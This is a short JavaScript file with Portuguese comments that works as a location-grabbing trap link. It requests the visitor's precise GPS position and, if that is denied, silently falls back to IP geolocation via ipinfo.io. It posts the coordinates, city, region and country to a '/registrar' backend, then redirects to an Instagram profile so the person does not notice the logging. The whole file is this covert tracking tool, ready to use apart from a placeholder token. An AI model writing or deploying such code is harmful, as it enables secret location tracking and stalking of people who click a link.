// Função para enviar os dados de localização para o backend - Maicon Ferreira
function enviarLocalizacao(lat, lon, precisa, city = '', region = '', country = '') {
    fetch('/registrar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        // Enviando latitude, longitude, precisão e dados geográficos - Maicon Ferreira
        body: JSON.stringify({ lat, lon, precisa, city, region, country })
    }).finally(() => {
        // Redireciona para o Instagram após o envio, independentemente do resultado - Maicon Ferreira
        window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
    });
}

// Função que tenta capturar a localização aproximada via IP (usando ipinfo.io) - Maicon Ferreira
function tentarLocalizacaoPorIP() {
    fetch('https://ipinfo.io/json?token=SEU_TOKEN_AQUI')  // Substitua por seu token real - Maicon Ferreira
        .then(res => res.json())
        .then(data => {
            if (!data.loc) throw new Error("Sem campo loc no IPInfo"); // Verifica se há coordenadas - Maicon Ferreira
            const [lat, lon] = data.loc.split(','); // Extrai latitude e longitude do campo "loc" - Maicon Ferreira
            enviarLocalizacao(parseFloat(lat), parseFloat(lon), false); // Envia como localização não precisa (IP) - Maicon Ferreira
        })
        .catch(err => {
            console.error("Erro ao buscar localização por IP:", err); // Loga o erro - Maicon Ferreira
            enviarLocalizacao(0.0, 0.0, false); // Envia valores nulos se falhar - Maicon Ferreira
        });
}

// Tenta obter a geolocalização precisa via GPS do navegador - Maicon Ferreira
navigator.geolocation.getCurrentPosition(
    pos => {
        const { latitude, longitude } = pos.coords; // Captura coordenadas precisas - Maicon Ferreira
        enviarLocalizacao(latitude, longitude, true); // Envia com precisão = true - Maicon Ferreira
    },
    err => {
        console.warn("GPS negado ou falhou:", err); // Aviso de erro ou negação - Maicon Ferreira
        tentarLocalizacaoPorIP(); // Se GPS falhar, tenta via IP - Maicon Ferreira
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Configurações para precisão máxima - Maicon Ferreira
);
